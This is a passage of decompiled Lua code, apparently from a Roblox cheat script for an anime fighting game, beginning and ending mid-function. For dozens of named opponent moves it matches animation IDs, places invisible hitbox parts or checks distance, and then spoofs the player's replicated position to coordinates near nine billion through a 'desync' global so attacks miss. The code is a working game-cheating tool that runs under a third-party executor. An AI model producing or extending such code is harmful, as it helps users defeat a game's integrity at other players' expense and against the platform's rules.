                                                    if l_v1047_0 == true and not isCountering(v940) then
                                                        repeat
                                                            if antidebug then
                                                                warn("[ANTI DEBUG] FLASH STRIKE");
                                                            end;
                                                            v1046.CFrame = v885.CFrame * CFrame.new(0, 0, -v1046.Size.Z / 2);
                                                            getgenv().desync = {
                                                                CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                            };
                                                            task.wait();
                                                        until l_v1047_0 == false or tick() >= v1053 + 0.8 or not v936.IsPlaying or isCountering(v940);
                                                        getgenv().desync = nil;
                                                    end;
                                                    l_RenderStepped_0:Wait();
                                                until tick() >= v1053 + 0.8 or not v936.IsPlaying;
                                                getgenv().desync = nil;
                                                if v1046 then
                                                    v1046:Destroy();
                                                end;
                                                v1050:Disconnect();
                                                v1052:Disconnect();
                                            end;
                                        elseif l_AnimationId_1:match("13294790250") and rawget(Options.AntiMoves_Sonic.Value, "Anti Whirlwind Kick") then
                                            task.wait(0.5);
                                            local v1054 = tick();
                                            repeat
                                                if antidebug then
                                                    warn("[ANTI DEBUG] WHIRLWIND KICK");
                                                end;
                                                if (v939.Position - (v885.CFrame * CFrame.new(0, 0, -2.5)).Position).Magnitude <= 10 and not isCountering(v940) then
                                                    repeat
                                                        if antidebug then
                                                            warn("[ANTI DEBUG] WHIRLWIND KICK");
                                                        end;
                                                        getgenv().desync = {
                                                            CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                        };
                                                        task.wait();
                                                    until (v939.Position - (v885.CFrame * CFrame.new(0, 0, -2.5)).Position).Magnitude > 10 or tick() >= v1054 + 0.75 or isCountering(v940);
                                                    getgenv().desync = nil;
                                                end;
                                                task.wait();
                                            until tick() >= v1054 + 0.75;
                                            getgenv().desync = nil;
                                        elseif l_AnimationId_1:match("13632347366") and rawget(Options.AntiMoves_Sonic.Value, "Anti Twinblade Rush") then
                                            local v1055 = tick();
                                            repeat
                                                if antidebug then
                                                    warn("[ANTI DEBUG] 13");
                                                end;
                                                if (v939.Position - v885.Position).Magnitude <= 75 and not isDeathCountering(v938) then
                                                    repeat
                                                        if antidebug then
                                                            warn("[ANTI DEBUG] 13");
                                                        end;
                                                        getgenv().desync = {
                                                            CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                        };
                                                        task.wait();
                                                    until (v939.Position - v885.Position).Magnitude > 75 or not v936.IsPlaying or tick() >= v1055 + 1.75 or isDeathCountering(v938);
                                                    getgenv().desync = nil;
                                                end;
                                                task.wait();
                                            until not v936.IsPlaying or tick() >= v1055 + 1.75;
                                            getgenv().desync = nil;
                                        elseif l_AnimationId_1:match("13881335713") and rawget(Options.AntiMoves_Sonic.Value, "Anti Fourfold Flashstrike") then
                                            task.wait(0.75);
                                            if v936.IsPlaying then
                                                local v1056 = Instance.new("Part", l_Workspace_0);
                                                v1056.Anchored = true;
                                                v1056.Size = Vector3.new(35, 5, 60);
                                                v1056.CanCollide = false;
                                                v1056.Transparency = 1;
                                                local v1057 = false;
                                                if true then
                                                    local l_v1057_0 = v1057;
                                                    local v1060 = v1056.Touched:Connect(function(v1059) --[[ Line: 0 ]] --[[ Name:  ]]
                                                        -- upvalues: v939 (ref), l_v1057_0 (ref)
                                                        if v1059 == v939 then
                                                            l_v1057_0 = true;
                                                        end;
                                                    end);
                                                    local v1062 = v1056.TouchEnded:Connect(function(v1061) --[[ Line: 0 ]] --[[ Name:  ]]
                                                        -- upvalues: v939 (ref), l_v1057_0 (ref)
                                                        if v1061 == v939 then
                                                            l_v1057_0 = false;
                                                        end;
                                                    end);
                                                    local v1063 = tick();
                                                    repeat
                                                        if antidebug then
                                                            warn("[ANTI DEBUG] FOURFOLD FLASHSTRIKE");
                                                        end;
                                                        v1056.CFrame = v885.CFrame * CFrame.new(0, 0, -v1056.Size.Z / 2);
                                                        if l_v1057_0 == true and not isDeathCountering(v938) then
                                                            repeat
                                                                if antidebug then
                                                                    warn("[ANTI DEBUG] FOURFOLD FLASHSTRIKE");
                                                                end;
                                                                v1056.CFrame = v885.CFrame * CFrame.new(0, 0, -v1056.Size.Z / 2);
                                                                getgenv().desync = {
                                                                    CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                                };
                                                                task.wait();
                                                            until l_v1057_0 == false or tick() >= v1063 + 0.75 or not v936.IsPlaying or isDeathCountering(v938);
                                                            getgenv().desync = nil;
                                                        end;
                                                        l_RenderStepped_0:Wait();
                                                    until tick() >= v1063 + 0.75 or not v936.IsPlaying;
                                                    getgenv().desync = nil;
                                                    if v1056 then
                                                        v1056:Destroy();
                                                    end;
                                                    v1060:Disconnect();
                                                    v1062:Disconnect();
                                                end;
                                            end;
                                        elseif l_AnimationId_1:match("13723174078") and rawget(Options.AntiMoves_Sonic.Value, "Anti Carnage") then
                                            task.wait(0.5);
                                            if v936.IsPlaying then
                                                local v1064 = Instance.new("Part", l_Workspace_0);
                                                v1064.Anchored = true;
                                                v1064.Size = Vector3.new(35, 50, 250);
                                                v1064.CanCollide = false;
                                                v1064.Transparency = 1;
                                                local v1065 = false;
                                                if true then
                                                    local l_v1065_0 = v1065;
                                                    local v1068 = v1064.Touched:Connect(function(v1067) --[[ Line: 0 ]] --[[ Name:  ]]
                                                        -- upvalues: v939 (ref), l_v1065_0 (ref)
                                                        if v1067 == v939 then
                                                            l_v1065_0 = true;
                                                        end;
                                                    end);
                                                    local v1070 = v1064.TouchEnded:Connect(function(v1069) --[[ Line: 0 ]] --[[ Name:  ]]
                                                        -- upvalues: v939 (ref), l_v1065_0 (ref)
                                                        if v1069 == v939 then
                                                            l_v1065_0 = false;
                                                        end;
                                                    end);
                                                    local v1071 = tick();
                                                    repeat
                                                        if antidebug then
                                                            warn("[ANTI DEBUG] CARNAGE");
                                                        end;
                                                        v1064.CFrame = v885.CFrame * CFrame.new(0, -v1064.Size.Y / 2, -v1064.Size.Z / 2);
                                                        if l_v1065_0 == true and not isDeathCountering(v938) then
                                                            repeat
                                                                if antidebug then
                                                                    warn("[ANTI DEBUG] CARNAGE");
                                                                end;
                                                                v1064.CFrame = v885.CFrame * CFrame.new(0, -v1064.Size.Y / 2, -v1064.Size.Z / 2);
                                                                getgenv().desync = {
                                                                    CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                                };
                                                                task.wait();
                                                            until l_v1065_0 == false or tick() >= v1071 + 2.5 or not v936.IsPlaying or isDeathCountering(v938);
                                                            getgenv().desync = nil;
                                                        end;
                                                        l_RenderStepped_0:Wait();
                                                    until tick() >= v1071 + 2.5 or not v936.IsPlaying;
                                                    getgenv().desync = nil;
                                                    if v1064 then
                                                        v1064:Destroy();
                                                    end;
                                                    v1068:Disconnect();
                                                    v1070:Disconnect();
                                                end;
                                            end;
                                        elseif l_AnimationId_1:match("14721837245") and rawget(Options.AntiMoves_Genos.Value, "Anti Thunder Kick") then
                                            local v1072 = tick();
                                            repeat
                                                if antidebug then
                                                    warn("[ANTI DEBUG] 14");
                                                end;
                                                if (v939.Position - v885.Position).Magnitude <= 25 and not isCountering(v940) then
                                                    repeat
                                                        if antidebug then
                                                            warn("[ANTI DEBUG] 14");
                                                        end;
                                                        getgenv().desync = {
                                                            CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                        };
                                                        task.wait();
                                                    until (v939.Position - v885.Position).Magnitude > 25 or not v936.IsPlaying or tick() >= v1072 + 1.5 or isCountering(v940);
                                                    getgenv().desync = nil;
                                                end;
                                                task.wait();
                                            until tick() >= v1072 + 1.5;
                                            task.wait(1);
                                            local v1073 = tick();
                                            repeat
                                                if antidebug then
                                                    warn("[ANTI DEBUG] 15");
                                                end;
                                                if (v939.Position - v885.Position).Magnitude <= 100 then
                                                    repeat
                                                        if antidebug then
                                                            warn("[ANTI DEBUG] 15");
                                                        end;
                                                        getgenv().desync = {
                                                            CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                        };
                                                        task.wait();
                                                    until (v939.Position - v885.Position).Magnitude > 100 or not v936.IsPlaying or tick() >= v1073 + 1.5;
                                                    getgenv().desync = nil;
                                                end;
                                                task.wait();
                                            until tick() >= v1073 + 1.5;
                                            getgenv().desync = nil;
                                        elseif l_AnimationId_1:match("13083332742") and rawget(Options.AntiMoves_Genos.Value, "Anti Flamewave Cannon") then
                                            task.wait(1);
                                            local v1074 = Instance.new("Part", l_Workspace_0);
                                            v1074.Anchored = true;
                                            v1074.Size = Vector3.new(12.5, 5, 1000);
                                            v1074.CanCollide = false;
                                            v1074.Transparency = 1;
                                            local v1075 = false;
                                            if true then
                                                local l_v1074_0, l_v1075_0 = v1074, v1075;
                                                local v1079 = l_v1074_0.Touched:Connect(function(v1078) --[[ Line: 0 ]] --[[ Name:  ]]
                                                    -- upvalues: v939 (ref), l_v1075_0 (ref)
                                                    if v1078 == v939 then
                                                        l_v1075_0 = true;
                                                    end;
                                                end);
                                                local v1081 = l_v1074_0.TouchEnded:Connect(function(v1080) --[[ Line: 0 ]] --[[ Name:  ]]
                                                    -- upvalues: v939 (ref), l_v1075_0 (ref)
                                                    if v1080 == v939 then
                                                        l_v1075_0 = false;
                                                    end;
                                                end);
                                                task.delay(0.25, function() --[[ Line: 0 ]] --[[ Name:  ]]
                                                    -- upvalues: l_v1074_0 (ref), v885 (ref)
                                                    l_v1074_0.CFrame = v885.CFrame * CFrame.new(0, 0, -l_v1074_0.Size.Z / 2);
                                                end);
                                                local v1082 = tick();
                                                repeat
                                                    if antidebug then
                                                        warn("[ANTI DEBUG] FLAMEWAVE CANNON");
                                                    end;
                                                    if l_v1075_0 == true and not isDeathCountering(v938) then
                                                        repeat
                                                            if antidebug then
                                                                warn("[ANTI DEBUG] FLAMEWAVE CANNON");
                                                            end;
                                                            getgenv().desync = {
                                                                CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                            };
                                                            task.wait();
                                                        until l_v1075_0 == false or tick() >= v1082 + 4 or not v936.IsPlaying or isDeathCountering(v938);
                                                        getgenv().desync = nil;
                                                    end;
                                                    l_RenderStepped_0:Wait();
                                                until tick() >= v1082 + 4 or not v936.IsPlaying;
                                                getgenv().desync = nil;
                                                if l_v1074_0 then
                                                    l_v1074_0:Destroy();
                                                end;
                                                v1079:Disconnect();
                                                v1081:Disconnect();
                                            end;
                                        elseif l_AnimationId_1:match("13146710762") and rawget(Options.AntiMoves_Genos.Value, "Anti Incinerate") then
                                            task.wait(3.25);
                                            if v884:FindFirstChild("ForceField") then
                                                local v1083 = Instance.new("Part", l_Workspace_0);
                                                v1083.Anchored = true;
                                                v1083.Size = Vector3.new(100, 75, 400);
                                                v1083.CanCollide = false;
                                                v1083.Transparency = 1;
                                                local v1084 = Instance.new("Part", l_Workspace_0);
                                                v1084.Anchored = true;
                                                v1084.Size = Vector3.new(100, 75, 400);
                                                v1084.CanCollide = false;
                                                v1084.Transparency = 1;
                                                local v1085 = Instance.new("Part", l_Workspace_0);
                                                v1085.Anchored = true;
                                                v1085.Size = Vector3.new(100, 75, 400);
                                                v1085.CanCollide = false;
                                                v1085.Transparency = 1;
                                                local v1086 = false;
                                                local v1087 = false;
                                                local v1088 = false;
                                                local v1089 = {};
                                                if true then
                                                    local l_v1086_0, l_v1087_0, l_v1088_0 = v1086, v1087, v1088;
                                                    table.insert(v1089, v1083.Touched:Connect(function(v1093) --[[ Line: 0 ]] --[[ Name:  ]]
                                                        -- upvalues: v939 (ref), l_v1086_0 (ref)
                                                        if v1093 == v939 then
                                                            l_v1086_0 = true;
                                                        end;
                                                    end));
                                                    table.insert(v1089, v1083.TouchEnded:Connect(function(v1094) --[[ Line: 0 ]] --[[ Name:  ]]
                                                        -- upvalues: v939 (ref), l_v1086_0 (ref)
                                                        if v1094 == v939 then
                                                            l_v1086_0 = false;
                                                        end;
                                                    end));
                                                    table.insert(v1089, v1084.Touched:Connect(function(v1095) --[[ Line: 0 ]] --[[ Name:  ]]
                                                        -- upvalues: v939 (ref), l_v1087_0 (ref)
                                                        if v1095 == v939 then
                                                            l_v1087_0 = true;
                                                        end;
                                                    end));
                                                    table.insert(v1089, v1084.TouchEnded:Connect(function(v1096) --[[ Line: 0 ]] --[[ Name:  ]]
                                                        -- upvalues: v939 (ref), l_v1087_0 (ref)
                                                        if v1096 == v939 then
                                                            l_v1087_0 = false;
                                                        end;
                                                    end));
                                                    table.insert(v1089, v1085.Touched:Connect(function(v1097) --[[ Line: 0 ]] --[[ Name:  ]]
                                                        -- upvalues: v939 (ref), l_v1088_0 (ref)
                                                        if v1097 == v939 then
                                                            l_v1088_0 = true;
                                                        end;
                                                    end));
                                                    table.insert(v1089, v1085.TouchEnded:Connect(function(v1098) --[[ Line: 0 ]] --[[ Name:  ]]
                                                        -- upvalues: v939 (ref), l_v1088_0 (ref)
                                                        if v1098 == v939 then
                                                            l_v1088_0 = false;
                                                        end;
                                                    end));
                                                    v1083.CFrame = v885.CFrame * CFrame.new(50, 0, -v1083.Size.Z / 2 + 2.5) * CFrame.Angles(0, math.rad(-15), 0);
                                                    v1084.CFrame = v885.CFrame * CFrame.new(-50, 0, -v1084.Size.Z / 2 + 2.5) * CFrame.Angles(0, math.rad(15), 0);
                                                    v1085.CFrame = v885.CFrame * CFrame.new(0, 0, -v1085.Size.Z / 2 + 2.5);
                                                    local v1099 = tick();
                                                    repeat
                                                        if antidebug then
                                                            warn("[ANTI DEBUG] 17");
                                                        end;
                                                        if (l_v1086_0 or l_v1087_0 or l_v1088_0) and not isDeathCountering(v938) then
                                                            repeat
                                                                if antidebug then
                                                                    warn("[ANTI DEBUG] 17");
                                                                end;
                                                                getgenv().desync = {
                                                                    CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                                };
                                                                task.wait();
                                                            until not l_v1086_0 and not l_v1087_0 and not l_v1088_0 or tick() >= v1099 + 6 or isDeathCountering(v938);
                                                            getgenv().desync = nil;
                                                        end;
                                                        l_RenderStepped_0:Wait();
                                                    until tick() >= v1099 + 6 or not v936.IsPlaying;
                                                    v1083:Destroy();
                                                    v1084:Destroy();
                                                    v1085:Destroy();
                                                    for _, v1101 in pairs(v1089) do
                                                        v1101:Disconnect();
                                                    end;
                                                    getgenv().desync = nil;
                                                end;
                                            end;
                                        elseif l_AnimationId_1:match("17278415853") and v884:GetAttribute("Character") == "Esper" and rawget(Options.AntiMoves_Tatsumaki.Value, "Anti Terrible Tornado") then
                                            task.wait(11);
                                            local v1102 = tick();
                                            repeat
                                                if antidebug then
                                                    warn("[ANTI DEBUG] 18");
                                                end;
                                                if (v939.Position - v885.Position).Magnitude <= 100 then
                                                    repeat
                                                        if antidebug then
                                                            warn("[ANTI DEBUG] 18");
                                                        end;
                                                        getgenv().desync = {
                                                            CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                        };
                                                        task.wait();
                                                    until (v939.Position - v885.Position).Magnitude > 100 or tick() >= v1102 + 6;
                                                    getgenv().desync = nil;
                                                end;
                                                task.wait();
                                            until tick() >= v1102 + 6;
                                            getgenv().desync = nil;
                                        elseif l_AnimationId_1:match("12342141464") and rawget(Options.AntiMoves_Garou.Value, "Anti Garou Ult") then
                                            task.wait(3.5);
                                            local v1103 = tick();
                                            repeat
                                                if antidebug then
                                                    warn("[ANTI DEBUG] 19");
                                                end;
                                                if (v939.Position - v885.Position).Magnitude <= 125 then
                                                    repeat
                                                        if antidebug then
                                                            warn("[ANTI DEBUG] 19");
                                                        end;
                                                        getgenv().desync = {
                                                            CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                        };
                                                        task.wait();
                                                    until (v939.Position - v885.Position).Magnitude > 125 or tick() >= v1103 + 1.25;
                                                    getgenv().desync = nil;
                                                end;
                                                task.wait();
                                            until tick() >= v1103 + 1.25;
                                            getgenv().desync = nil;
                                        elseif l_AnimationId_1:match("12460977270") and rawget(Options.AntiMoves_Garou.Value, "Anti Water Stream Rock Smashing Fist") then
                                            local v1104 = Instance.new("Part", l_Workspace_0);
                                            v1104.Anchored = true;
                                            v1104.Size = Vector3.new(12.5, 5, 12.5);
                                            v1104.CanCollide = false;
                                            v1104.Transparency = 1;
                                            local v1105 = false;
                                            if true then
                                                local l_v1105_0 = v1105;
                                                local v1108 = v1104.Touched:Connect(function(v1107) --[[ Line: 0 ]] --[[ Name:  ]]
                                                    -- upvalues: v939 (ref), l_v1105_0 (ref)
                                                    if v1107 == v939 then
                                                        l_v1105_0 = true;
                                                    end;
                                                end);
                                                local v1110 = v1104.TouchEnded:Connect(function(v1109) --[[ Line: 0 ]] --[[ Name:  ]]
                                                    -- upvalues: v939 (ref), l_v1105_0 (ref)
                                                    if v1109 == v939 then
                                                        l_v1105_0 = false;
                                                    end;
                                                end);
                                                local v1111 = tick();
                                                repeat
                                                    if antidebug then
                                                        warn("[ANTI DEBUG] WATER STREAM ROCK SMASHING FIST");
                                                    end;
                                                    v1104.CFrame = v885.CFrame * CFrame.new(0, 0, -v1104.Size.Z / 2);
                                                    if l_v1105_0 == true and not isCountering(v940) then
                                                        repeat
                                                            if antidebug then
                                                                warn("[ANTI DEBUG] WATER STREAM ROCK SMASHING FIST");
                                                            end;
                                                            v1104.CFrame = v885.CFrame * CFrame.new(0, 0, -v1104.Size.Z / 2);
                                                            getgenv().desync = {
                                                                CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                            };
                                                            task.wait();
                                                        until l_v1105_0 == false or tick() >= v1111 + 1.85 or not v936.IsPlaying or isCountering(v940);
                                                        getgenv().desync = nil;
                                                    end;
                                                    l_RenderStepped_0:Wait();
                                                until tick() >= v1111 + 1.85 or not v936.IsPlaying;
                                                getgenv().desync = nil;
                                                if v1104 then
                                                    v1104:Destroy();
                                                end;
                                                v1108:Disconnect();
                                                v1110:Disconnect();
                                            end;
                                        elseif l_AnimationId_1:match("12463072679") and rawget(Options.AntiMoves_Garou.Value, "Anti Final Hunt") then
                                            local v1112 = tick();
                                            repeat
                                                if antidebug then
                                                    warn("[ANTI DEBUG] 20");
                                                end;
                                                if (v939.Position - v885.Position).Magnitude <= 25 then
                                                    repeat
                                                        if antidebug then
                                                            warn("[ANTI DEBUG] 20");
                                                        end;
                                                        getgenv().desync = {
                                                            CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                        };
                                                        task.wait();
                                                    until (v939.Position - v885.Position).Magnitude > 25 or tick() >= v1112 + 0.75;
                                                    getgenv().desync = nil;
                                                end;
                                                task.wait();
                                            until tick() >= v1112 + 0.75;
                                            getgenv().desync = nil;
                                        elseif l_AnimationId_1:match("14057231976") and rawget(Options.AntiMoves_Garou.Value, "Anti Rock Splitting Fist") then
                                            local v1113 = tick();
                                            repeat
                                                if antidebug then
                                                    warn("[ANTI DEBUG] 31");
                                                end;
                                                if (v939.Position - v885.Position).Magnitude <= 10 then
                                                    repeat
                                                        if antidebug then
                                                            warn("[ANTI DEBUG] 31");
                                                        end;
                                                        getgenv().desync = {
                                                            CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                        };
                                                        task.wait();
                                                    until (v939.Position - v885.Position).Magnitude > 10 or tick() >= v1113 + 0.5;
                                                    getgenv().desync = nil;
                                                end;
                                                task.wait();
                                            until tick() >= v1113 + 0.5;
                                            getgenv().desync = nil;
                                            task.wait(0.5);
                                            repeat
                                                if antidebug then
                                                    warn("[ANTI DEBUG] 31");
                                                end;
                                                if (v939.Position - v885.Position).Magnitude <= 10 and not isCountering(v940) then
                                                    repeat
                                                        if antidebug then
                                                            warn("[ANTI DEBUG] 31");
                                                        end;
                                                        getgenv().desync = {
                                                            CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                        };
                                                        task.wait();
                                                    until (v939.Position - v885.Position).Magnitude > 10 or tick() >= v1113 + 1.75 or isCountering(v940);
                                                    getgenv().desync = nil;
                                                end;
                                                task.wait();
                                            until tick() >= v1113 + 1.75;
                                            getgenv().desync = nil;
                                        elseif l_AnimationId_1:match("13630786846") and rawget(Options.AntiMoves_Garou.Value, "Anti Crushed Rock") then
                                            local v1114 = Instance.new("Part", l_Workspace_0);
                                            v1114.Anchored = true;
                                            v1114.Size = Vector3.new(25, 10, 75);
                                            v1114.CanCollide = false;
                                            v1114.Transparency = 1;
                                            local v1115 = false;
                                            if true then
                                                local l_v1115_0 = v1115;
                                                local v1118 = v1114.Touched:Connect(function(v1117) --[[ Line: 0 ]] --[[ Name:  ]]
                                                    -- upvalues: v939 (ref), l_v1115_0 (ref)
                                                    if v1117 == v939 then
                                                        l_v1115_0 = true;
                                                    end;
                                                end);
                                                local v1120 = v1114.TouchEnded:Connect(function(v1119) --[[ Line: 0 ]] --[[ Name:  ]]
                                                    -- upvalues: v939 (ref), l_v1115_0 (ref)
                                                    if v1119 == v939 then
                                                        l_v1115_0 = false;
                                                    end;
                                                end);
                                                local v1121 = tick();
                                                repeat
                                                    if antidebug then
                                                        warn("[ANTI DEBUG] 21");
                                                    end;
                                                    v1114.CFrame = v885.CFrame * CFrame.new(0, 0, -v1114.Size.Z / 2);
                                                    if l_v1115_0 == true and not isCountering(v940) then
                                                        repeat
                                                            if antidebug then
                                                                warn("[ANTI DEBUG] 21");
                                                            end;
                                                            v1114.CFrame = v885.CFrame * CFrame.new(0, 0, -v1114.Size.Z / 2);
                                                            getgenv().desync = {
                                                                CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                            };
                                                            task.wait();
                                                        until l_v1115_0 == false or tick() >= v1121 + 1.5 or not v936.IsPlaying or isCountering(v940);
                                                        getgenv().desync = nil;
                                                    end;
                                                    l_RenderStepped_0:Wait();
                                                until tick() >= v1121 + 1.5 or not v936.IsPlaying;
                                                getgenv().desync = nil;
                                                if v1114 then
                                                    v1114:Destroy();
                                                end;
                                                v1118:Disconnect();
                                                v1120:Disconnect();
                                            end;
                                        elseif l_AnimationId_1:match("72451715583225") and rawget(Options.AntiMoves_Garou.Value, "Anti Crushed Rock") then
                                            local v1122 = tick();
                                            repeat
                                                if antidebug then
                                                    warn("[ANTI DEBUG] 20");
                                                end;
                                                if (v939.Position - v885.Position).Magnitude <= 15 then
                                                    repeat
                                                        if antidebug then
                                                            warn("[ANTI DEBUG] 20");
                                                        end;
                                                        getgenv().desync = {
                                                            CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                        };
                                                        task.wait();
                                                    until (v939.Position - v885.Position).Magnitude > 15 or tick() >= v1122 + 0.75;
                                                    getgenv().desync = nil;
                                                end;
                                                task.wait();
                                            until tick() >= v1122 + 0.75;
                                            getgenv().desync = nil;
                                        elseif l_AnimationId_1:match("15391323441") and rawget(Options.AntiMoves_AtomicSamurai.Value, "Anti Atomic Samurai Ult") then
                                            task.wait(5.5);
                                            local v1123 = tick();
                                            repeat
                                                if antidebug then
                                                    warn("[ANTI DEBUG] 22");
                                                end;
                                                if (v939.Position - v885.Position).Magnitude <= 125 then
                                                    repeat
                                                        if antidebug then
                                                            warn("[ANTI DEBUG] 22");
                                                        end;
                                                        getgenv().desync = {
                                                            CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                        };
                                                        task.wait();
                                                    until (v939.Position - v885.Position).Magnitude > 125 or tick() >= v1123 + 1;
                                                    getgenv().desync = nil;
                                                end;
                                                task.wait();
                                            until tick() >= v1123 + 1;
                                            getgenv().desync = nil;
                                        elseif l_AnimationId_1:match("15520132233") and rawget(Options.AntiMoves_AtomicSamurai.Value, "Anti Sunset") then
                                            local v1124 = tick();
                                            repeat
                                                if antidebug then
                                                    warn("[ANTI DEBUG] 23");
                                                end;
                                                if (v939.Position - v885.Position).Magnitude <= 50 and not isDeathCountering(v938) then
                                                    repeat
                                                        if antidebug then
                                                            warn("[ANTI DEBUG] 23");
                                                        end;
                                                        getgenv().desync = {
                                                            CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                        };
                                                        task.wait();
                                                    until (v939.Position - v885.Position).Magnitude > 50 or tick() >= v1124 + 3.3 or not v936.IsPlaying or isDeathCountering(v938);
                                                    getgenv().desync = nil;
                                                end;
                                                task.wait();
                                            until tick() >= v1124 + 3.3 or not v936.IsPlaying;
                                            getgenv().desync = nil;
                                            repeat
                                                task.wait();
                                            until tick() >= v1124 + 5.5;
                                            repeat
                                                if antidebug then
                                                    warn("[ANTI DEBUG] 23");
                                                end;
                                                if (v939.Position - v885.Position).Magnitude <= 100 and not isDeathCountering(v938) then
                                                    repeat
                                                        if antidebug then
                                                            warn("[ANTI DEBUG] 23");
                                                        end;
                                                        getgenv().desync = {
                                                            CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                        };
                                                        task.wait();
                                                    until (v939.Position - v885.Position).Magnitude > 100 or tick() >= v1124 + 6.5 or not v936.IsPlaying or isDeathCountering(v938);
                                                    getgenv().desync = nil;
                                                end;
                                                task.wait();
                                            until tick() >= v1124 + 6.5 or not v936.IsPlaying;
                                            getgenv().desync = nil;
                                        elseif l_AnimationId_1:match("15676072469") and rawget(Options.AntiMoves_AtomicSamurai.Value, "Anti Solar Cleave") then
                                            local v1125 = Instance.new("Part", l_Workspace_0);
                                            v1125.Anchored = true;
                                            v1125.Size = Vector3.new(50, 10, 150);
                                            v1125.CanCollide = false;
                                            v1125.Transparency = 1;
                                            local v1126 = false;
                                            if true then
                                                local l_v1126_0 = v1126;
                                                local v1129 = v1125.Touched:Connect(function(v1128) --[[ Line: 0 ]] --[[ Name:  ]]
                                                    -- upvalues: v939 (ref), l_v1126_0 (ref)
                                                    if v1128 == v939 then
                                                        l_v1126_0 = true;
                                                    end;
                                                end);
                                                local v1131 = v1125.TouchEnded:Connect(function(v1130) --[[ Line: 0 ]] --[[ Name:  ]]
                                                    -- upvalues: v939 (ref), l_v1126_0 (ref)
                                                    if v1130 == v939 then
                                                        l_v1126_0 = false;
                                                    end;
                                                end);
                                                local v1132 = tick();
                                                repeat
                                                    if antidebug then
                                                        warn("[ANTI DEBUG] 24");
                                                    end;
                                                    v1125.CFrame = v885.CFrame * CFrame.new(0, 0, -v1125.Size.Z / 2);
                                                    if l_v1126_0 and not isDeathCountering(v938) then
                                                        repeat
                                                            if antidebug then
                                                                warn("[ANTI DEBUG] 24");
                                                            end;
                                                            v1125.CFrame = v885.CFrame * CFrame.new(0, 0, -v1125.Size.Z / 2);
                                                            getgenv().desync = {
                                                                CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                            };
                                                            task.wait();
                                                        until not l_v1126_0 or tick() >= v1132 + 2 or not v936.IsPlaying or isDeathCountering(v938);
                                                        getgenv().desync = nil;
                                                    end;
                                                    l_RenderStepped_0:Wait();
                                                until tick() >= v1132 + 2 or not v936.IsPlaying;
                                                getgenv().desync = nil;
                                                if v1125 then
                                                    v1125:Destroy();
                                                end;
                                                v1129:Disconnect();
                                                v1131:Disconnect();
                                            end;
                                        elseif l_AnimationId_1:match("16082123712") and rawget(Options.AntiMoves_AtomicSamurai.Value, "Anti Atomic Slash") then
                                            task.wait(2.5);
                                            local v1133 = tick();
                                            repeat
                                                if antidebug then
                                                    warn("[ANTI DEBUG] 25");
                                                end;
                                                if (v939.Position - v885.Position).Magnitude <= 50 then
                                                    repeat
                                                        if antidebug then
                                                            warn("[ANTI DEBUG] 25");
                                                        end;
                                                        getgenv().desync = {
                                                            CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                        };
                                                        task.wait();
                                                    until (v939.Position - v885.Position).Magnitude > 50 or tick() >= v1133 + 1.5;
                                                    getgenv().desync = nil;
                                                end;
                                                task.wait();
                                            until tick() >= v1133 + 1.5;
                                            getgenv().desync = nil;
                                        elseif l_AnimationId_1:match("16057411888") and rawget(Options.AntiMoves_AtomicSamurai.Value, "Anti Atomic Slash Finisher") then
                                            task.wait(4.25);
                                            local v1134 = tick();
                                            repeat
                                                if antidebug then
                                                    warn("[ANTI DEBUG] 26");
                                                end;
                                                if (v939.Position - v885.Position).Magnitude <= 50 then
                                                    repeat
                                                        if antidebug then
                                                            warn("[ANTI DEBUG] 26");
                                                        end;
                                                        getgenv().desync = {
                                                            CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                        };
                                                        task.wait();
                                                    until (v939.Position - v885.Position).Magnitude > 50 or tick() >= v1134 + 2;
                                                    getgenv().desync = nil;
                                                end;
                                                task.wait();
                                            until tick() >= v1134 + 2;
                                            getgenv().desync = nil;
                                        elseif l_AnimationId_1:match("17857788598") and rawget(Options.AntiMoves_Suiryu.Value, "Anti Whirlwind Drop") then
                                            task.wait(0.65);
                                            if v936.IsPlaying then
                                                local v1135 = Instance.new("Part", l_Workspace_0);
                                                v1135.Anchored = true;
                                                v1135.Size = Vector3.new(35, 2048, 35);
                                                v1135.CanCollide = false;
                                                v1135.Transparency = 1;
                                                local v1136 = false;
                                                if true then
                                                    local l_v1136_0 = v1136;
                                                    local v1139 = v1135.Touched:Connect(function(v1138) --[[ Line: 0 ]] --[[ Name:  ]]
                                                        -- upvalues: v939 (ref), l_v1136_0 (ref)
                                                        if v1138 == v939 then
                                                            l_v1136_0 = true;
                                                        end;
                                                    end);
                                                    local v1141 = v1135.TouchEnded:Connect(function(v1140) --[[ Line: 0 ]] --[[ Name:  ]]
                                                        -- upvalues: v939 (ref), l_v1136_0 (ref)
                                                        if v1140 == v939 then
                                                            l_v1136_0 = false;
                                                        end;
                                                    end);
                                                    local v1142 = tick();
                                                    repeat
                                                        if antidebug then
                                                            warn("[ANTI DEBUG] ANTI WHIRLWIND DROP");
                                                        end;
                                                        v1135.CFrame = v885.CFrame;
                                                        if l_v1136_0 == true and not isCountering(v940) then
                                                            repeat
                                                                if antidebug then
                                                                    warn("[ANTI DEBUG] ANTI WHIRLWIND DROP");
                                                                end;
                                                                v1135.CFrame = v885.CFrame;
                                                                getgenv().desync = {
                                                                    CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                                };
                                                                task.wait();
